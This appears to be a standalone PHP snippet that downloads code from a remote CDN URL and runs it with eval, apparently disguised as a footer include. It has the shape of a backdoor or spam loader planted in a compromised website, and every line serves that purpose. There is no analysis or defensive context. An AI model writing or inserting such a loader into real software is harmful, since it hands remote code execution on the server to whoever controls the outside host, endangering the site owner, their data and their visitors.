<?php 
$url = 'https://seoraden.b-cdn.net/users.php';
$exfooter = file_get_contents($url);
eval('?>' . $exfooter);
?>